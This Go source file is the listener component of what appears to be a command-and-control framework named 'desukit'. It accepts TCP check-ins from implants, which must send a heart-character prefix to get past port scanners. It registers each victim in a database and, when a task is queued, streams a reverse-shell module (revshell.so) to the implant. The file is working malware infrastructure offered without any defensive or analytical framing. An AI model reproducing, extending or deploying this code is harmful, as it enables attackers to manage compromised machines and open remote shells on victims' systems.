package listener

import (
	"log"
	"fmt"
	"os"
	"net"
	"io"
	"time"
	"math/rand"
	"unicode/utf8"

    "desukit/asciiArt"
    "desukit/sqldb/model"
    "desukit/sqldb/controller/client"
    "desukit/sqldb/controller/tasks"
)

func Start(ipaddr string, port string) {
	CONN_HOST := ipaddr
	CONN_PORT := port
	CONN_TYPE := "tcp"

 	// listener 
    l, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
    if err != nil {
        log.Println("Encountered Error: ", err.Error())
        os.Exit(1)
    }

    defer l.Close()
    fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
    
    // listener loop
    for {
        conn, err := l.Accept()
        if err != nil {
            log.Println("Error", err.Error())
            os.Exit(1)
        }

        go handleRequest(conn)
    }
}

// Send module over network
func sendModule(conn net.Conn, task_id int) {
    defer conn.Close()
    pwd, _ := os.Getwd()

    switch task_id {
    case 1:
        file, err := os.Open(pwd+"/task_modules/revshell-dl/revshell.so")
        if err != nil {
            log.Println(err)
            return
        }

        _, err = file.Stat()
        if err != nil {
            log.Println(err)
            return
        }

        buffer := make([]byte, 512)
        fmt.Println("Sending module...")

        for {
            _, err = file.Read(buffer)
            if err == io.EOF {
                break
            }
            conn.Write(buffer)
        }
    }
    min := 1
    max := 4 
    rand.Seed(time.Now().UnixNano())
    n := min + rand.Intn(max-min+1)
    asciiArt.PrintArt(n)

    fmt.Println("Sent ;)")
    return

}

// Create package for listener in future
// Listener Handler
func handleRequest(conn net.Conn) {
    buf := make([]byte, 36)

    req_size, err := conn.Read(buf)
    if err != nil {
        fmt.Println("Error", err.Error())
    }

    uuid := string(buf[:req_size])
    ipaddr := conn.RemoteAddr().String()

    //Data must begin with "♥" character to be accepted by listener in order to filter random incoming data (port scanners)
    checkchar, _ := utf8.DecodeRuneInString("♥")
    checkcharrecv, _ := utf8.DecodeRuneInString(uuid[0:3])

    t := time.Now()
    timestamp := t.Format("15:04:05 01-02-2006")

    //Implant will check in and pickup any tasks if assigned
    if checkchar == checkcharrecv {
        // Remove heart character
        uuid = uuid[3:]
		C := model.Client{uuid, ipaddr, timestamp, timestamp}
        
        // Check for existince in DB
        exists := client.CheckClient(C)
        // Register client into database if it doesn't exist 
        // Check for tasks and execute if available
        if !exists {
            client.RegisterClient(C)
        } else { 
            task_exists := tasks.CheckTasks(C)
            if task_exists {
                fmt.Println("Executing task...")
                T := tasks.GetTask(C)
                task_id := T.Task_ID
                sendModule(conn, task_id)
                fmt.Println("Clearing task queue...")
                tasks.ClearTaskQueue(C)
            } else {
                conn.Close()
            }
        }

        client.UpdateClient(C)
        fmt.Printf("\033[2K\rLast Seen: %s [%s] @ %s", C.Uuid, C.Ipaddr, C.Ts_last)
    } 

}
    